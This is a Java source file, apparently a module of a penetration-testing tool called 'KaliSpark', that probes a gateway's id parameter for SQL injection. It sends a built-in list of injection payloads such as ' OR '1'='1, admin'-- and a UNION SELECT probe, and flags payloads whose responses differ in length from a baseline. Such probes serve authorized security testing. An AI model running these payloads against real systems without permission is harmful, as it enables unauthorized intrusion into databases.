package com.kalispark.attack;

import com.kalispark.core.BaseModule;
import com.kalispark.core.Ctx;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SqliProbe extends BaseModule {

    private static final String[] PAYLOADS = {
        "'", "\"", "')", "' OR '1'='1", "1' AND '1'='1",
        "1' AND '1'='2", "1 AND 1=1", "1 AND 1=2",
        "admin'--", "1' UNION SELECT NULL--"
    };

    @Override public String name() { return "sqli_probe"; }
    @Override public String category() { return "attack"; }
    @Override public int order() { return 1; }
    @Override public boolean requiresAuth() { return true; }

    @Override
    public void run(Ctx ctx) {
        String url = "http://" + ctx.gateway + "/?id=1";
        ctx.out.emit("=== SQL 注入: " + url + " ===");

        int baseline = getLen(url);
        ctx.out.emit("基线长度: " + baseline);
        if (baseline < 0) {
            ctx.out.emit("目标不可达，退出");
            return;
        }

        int hits = 0;
        for (String p : PAYLOADS) {
            String test = replace(url, p);
            int len = getLen(test);
            if (len < 0) { ctx.out.emit("[错误] " + p); continue; }
            int diff = Math.abs(len - baseline);
            if (diff > 50) {
                ctx.out.emit("[差异] " + p + " 长度=" + len + " 差=" + diff);
                hits++;
            } else {
                ctx.out.emit("[一致] " + p);
            }
        }
        ctx.out.emit("完成，可疑 " + hits + " 个");
    }

    private int getLen(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.setRequestMethod("GET");
            c.setRequestProperty("User-Agent", "KaliSpark/0.1");
            c.getResponseCode();
            int len = c.getContentLength();
            if (len >= 0) return len;
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
            return sb.length();
        } catch (Exception e) { return -1; }
    }

    private String replace(String url, String payload) {
        try {
            int q = url.indexOf('?');
            if (q < 0) return url;
            return url.substring(0, q + 1) + "id="
                + URLEncoder.encode(payload, "UTF-8");
        } catch (Exception e) { return url; }
    }
}
